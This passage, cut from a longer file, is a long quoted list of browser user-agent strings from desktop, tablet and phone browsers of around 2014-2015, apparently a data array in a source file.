AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-P600 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16', 'Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDSJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; QMV7B Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NISSC; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9) AppleWebKit/537.71 (KHTML, like Gecko) Version/7.0 Safari/537.71', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MALC; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.0; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T700 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER', 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)', 'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B466 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727)', 'Mozilla/5.0 (Linux; Android 5.0.2; VK810 4G Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; SMJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.50 (KHTML, like Gecko) Version/9.0 Safari/601.1.50', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:RESERVED)', 'Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56', 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B440 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) MsnBot-Media /1.0b', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/7.0)', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G920V Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 6680.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.102 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T900 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12D508 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; GT-N8013 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0', 'Mozilla/5.0 (Linux; Android 5.0.1; SM-N910V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4', 'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B466 Safari/600.1.4', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T310 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 10 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 'Mozilla/5.0 (X11; CrOS x86_64 7077.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (Linux; Android 4.4.2; QMV7A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-N900A Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; XT1080 Build/SU6-7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASJB; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.73.11 (KHTML, like Gecko) Version/7.0.1 Safari/537.73.11', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36', 'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [Pinterest/iOS]', 'Mozilla/5.0 (Linux; Android 5.0.1; LGLK430 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 